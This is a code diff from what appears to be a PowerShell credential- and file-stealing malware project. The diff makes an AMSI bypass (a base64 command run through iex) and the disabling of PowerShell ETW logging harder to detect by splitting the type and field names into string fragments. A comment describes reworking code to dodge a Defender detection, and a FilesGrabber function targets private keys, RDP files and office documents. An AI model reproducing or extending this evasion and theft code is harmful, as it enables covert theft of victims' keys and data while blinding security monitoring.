@@ -69,7 +69,7 @@ function KDMUTEX {
 function CHECK_AND_PATCH {
     ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
     ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
-    ([Reflection.Assembly]::LoadWithPartialName(('System.Core')).GetType(('System.Diagnostics.Eventing.EventProvider')).GetField(('m_enabled'), ('NonPublic,Instance')).SetValue([Ref].Assembly.GetType(('System.Management.Automation.Tracing.PSEtwLogProvider')).GetField(('etwProvider'), ('NonPublic,Static')).GetValue($null), 0))
+    ([Reflection.Assembly]::LoadWithPartialName((('Sy'+'st'+'em.'+'Core'))).GetType((('System.Diag'+'n'+'o'+'sti'+'cs.Ev'+'e'+'nting'+'.E'+'vent'+'Provi'+'der'))).GetField((('m_en'+'abled')), (('N'+'onP'+'ublic,'+'Instanc'+'e'))).SetValue([Ref].Assembly.GetType((('Syst'+'em.Ma'+'nage'+'ment.Aut'+'om'+'ation.'+'Tra'+'cing.'+'PSEtw'+'LogPr'+'ovider'))).GetField((('etw'+'Prov'+'ider')), (('Non'+'Pub'+'lic,Sta'+'tic'))).GetValue($null), 0))
     $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $kematiancheck
 }
@@ -958,7 +958,6 @@ function Backup-Data {
     # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
     #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
 
- ]
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
